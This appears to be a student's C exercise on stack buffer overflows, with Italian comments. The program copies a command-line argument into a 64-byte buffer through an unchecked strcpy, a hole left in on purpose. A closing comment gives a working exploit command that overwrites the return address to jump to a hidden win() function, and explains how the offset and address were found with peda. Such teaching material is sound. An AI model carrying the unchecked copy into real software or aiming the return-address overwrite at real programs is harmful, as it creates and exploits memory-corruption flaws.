#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

//codice per il code injection

void win() //devo inserire l'indirizzo di questa funzione
{
 printf("\nc0d3 fl0w 5ucc355fully ch4n63d\n");
 exit(0);
}

int main(int argc, char *argv[])
{
  char buffer[64]; //ho un buffer con 64 caratteri
  if(argc == 1)
  {
    printf("Usage: %s argument\n", argv[0]);
    exit(1);
  }
  strcpy(buffer,argv[1]); //argv[1] e` il sec argomento da linea di com
  printf("%s",buffer);
}

//comando "soluzione": ./bof2 $(python -c 'print "a"*68 + "bbbb" +"\x9b\x84\x04\x08"')
//68 a per esaurire il buffer senza dubbio --> dobbiamo scrivere piu' di 64 byte per andare a sovrascrivere lo stack del main, in particolare voglio arrivare al ret_addr per inserire l'indirizzo di win
//4 b per l'analisi fatta tramite peda -> perche si scopre che il ret addr e' dopo 72 caratteri quindi 68 e poi altri 4
//poi 0x804849b e` l'indirizzo della funzione win trovato tramite il comando 
// "p win" su peda

